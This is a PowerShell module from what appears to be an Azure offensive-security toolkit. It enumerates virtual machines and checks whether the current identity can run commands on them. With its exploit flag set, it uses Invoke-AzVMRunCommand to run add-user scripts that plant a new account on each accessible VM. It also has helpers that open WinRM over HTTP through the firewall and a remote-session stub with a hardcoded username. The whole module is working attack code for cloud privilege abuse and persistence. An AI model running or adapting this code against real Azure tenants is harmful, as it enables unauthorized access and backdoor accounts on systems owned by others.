<#
.SYNOPSIS
    This script allow to enumerate AZ VMs in Azure environnement

.DESCRIPTION
    It list the available VMs and check if the user can perform code execution on it
#>

#Import functions
. "$PSScriptRoot\..\Scripts\Private\checkPermission.ps1"
. "$PSScriptRoot\..\Scripts\Private\managementApiHttpRequest.ps1"

Function enumVms{
    param(
        [string]$userObjectId,
        [boolean]$exploit
        )
    # Get readable VMs
    $vms = Get-AzVM | fl

    if($vms){
        Write-Host "[*] Some VM found :"
        $vmUp = Get-AzVM -status | where {$_.PowerState -EQ "VM running"}
        $vmDown = Get-AzVM -status | where {$_.PowerState -EQ "VM stopped"}
        if($vmUp){
            Write-Host "[*] VM(s) up found, let's check to get some info`r`n"
            foreach($vm in $vmUp){
                $vmInfos = getInfo -vm $vm -userObjectId $userObjectId
                if ($($vmInfos.Permission) -eq $true -and $exploit -eq $true) {
                   addUser -os $vmInfos.Os -vmName $vmInfos.Name -resourceGroupName $($vmUp.ResourceGroupName)     
                }

            }

        
        } elseif($vmDown){
            Write-Host "[-] The following VM(s) is/are downs : `r`n" -ForegroundColor DarkYellow
            Write-Host "$($vmsName) `r`n" -ForegroundColor DarkYellow
        }else{
            Write-Host "[-] The VM is in unknown state"
        }

    }

    else{
        Write-Host "[-] No VMs available for the current user`r`n" -ForegroundColor DarkYellow

    }

}

Function getInfo{
    param(
        [psobject]$vm,
        [string]$userObjectId
    )
    $vmInfos = @()
    $vmName = $vm.Name
    $vmOS = $vm.StorageProfile.OsDisk.OsType

    Write-Host "[*] VM Name : $vmName"
    Write-Host "[*] VM OS : $vmOS"
    $publicIpAddress = GetPublicIp -vm $vm

    if($publicIpAddress){

        $roleAssignments = Get-AzRoleAssignment -ObjectId $userObjectId -Scope $vm.Id

        $RequiredActions = @(
            "Microsoft.Compute/virtualMachines/*",
            "Microsoft.Compute/virtualMachines/runCommand/*",
            "Microsoft.Compute/virtualMachines/runCommand/action",
            "*"
            )

        $hasRunCommandPermission = checkPermission -permissions $RequiredActions -roleAssignments $roleAssignments

        if($hasRunCommandPermission){
            $permission = $true
            Write-Host "[+] The user have sufficient rights to run command on the VM, this can be exploit to add new user" -ForegroundColor Green
        } else{
           $permission = $false 
           #check enventually if user have login right to perform some actions on the VM
           Write-Host "[-] The user don't have sufficient right to run command on the VM"  
        }
    }

    $vmObject = [PSCustomObject]@{
        Name = $vmName
        Os = $vmOS
        Ip = $publicIpAddress
        Permission  = $permission
    }

    $vmInfos += $vmObject

    return $vmInfos
}

Function GetPublicIp {
    param(
        [psobject]$vm
        )

    $vmName = $vm.Name

    try {
        $networkProfile = (Get-AzVM -Name $vmName -ResourceGroupName $vm.ResourceGroupName).NetworkProfile
        $networkInterfaces = (Get-AzNetworkInterface -Name $networkProfile.NetworkInterfaces.Id).Name
        $ipConfigurations =  (Get-AzNetworkInterface -Name $networkInterfaces).IpConfigurationsText | ConvertFrom-Json
        $publicIpAddressName = $ipConfigurations[0].PublicIpAddress
        $publicIpAddress = (Get-AzPublicIpAddress -Name $publicIpAddressName.Id).IpAddress

        if($publicIpAddress){
            Write-Host "[*] Public Ip found : $publicIpAddress"
        } else {
            Write-Host "[-] No public IP found"
        }
    } catch {
        Write-Error "Error to get public ip of the vm : $_"
    }

    return $publicIpAddress
    
}

Function enableWinRm{
    # Enable WinRM service
    Set-Service -Name winrm -StartupType Automatic
    Start-Service -Name winrm

    # Configure WinRM
    winrm quickconfig -force

    # Set up the listener for HTTP
    winrm create winrm/config/Listener?Address=*+Transport=HTTP

    # Configure the firewall to allow WinRM HTTP traffic
    New-NetFirewallRule -Name "WinRM_HTTP" -DisplayName "WinRM over HTTP" -Enabled True -Direction Inbound -Protocol TCP -LocalPort 5985

}

Function disableWinRm{
    # Stop and disable the WinRM service
    Stop-Service -Name winrm
    Set-Service -Name winrm -StartupType Disabled

    # Remove the WinRM HTTP listener
    winrm delete winrm/config/Listener?Address=*+Transport=HTTP

    # Remove the firewall rule for WinRM HTTP
    Remove-NetFirewallRule -Name "WinRM_HTTP"

}

Function addUser {
    param(
        [string]$os,
        [string]$vmName,
        [string]$resourceGroupName
        )
    if($os -eq "Windows"){
        $commandId = "RunPowerShellScript"
        $scriptPath = "$PSScriptRoot\..\Scripts\Public\adduser.ps1"

    }elseif($os -eq "Linux"){
        $commandId = "RunShellScript"
        $scriptPath = "$PSScriptRoot\..\Scripts\Public\adduser.sh"


    }else{
        Write-Host "[-] The script does not support command execution on os $os" 
        return 
    }
    try{
        # Create new user Topaz
        Write-Host "[*] let's try to run command and create a new user `r`n"
        Write-Host "-------------------------------------------------------"
        Invoke-AzVMRunCommand -ScriptPath $scriptPath -CommandId $commandId -VMName $vmName -ResourceGroupName $resourceGroupName
        Write-Host "-------------------------------------------------------"

    }catch{
        Write-Error "Error to run command on vm : $_" 
    }

}

Function CreatePsSession{
    param(
        [string]$publicIpAddress
        )
    $creds = New-Object System.management.Automation.PSCredential("test", $password)
    $sess  = New-PSSession -ComputerName $publicIpAddress -Credential $creds -Sessionoption (New-PSSessionOption -ProxyAccessType NoProxyServer)
    #Enter-PSSession $sess
}

# Export functions
Export-ModuleMember -Function enumVms

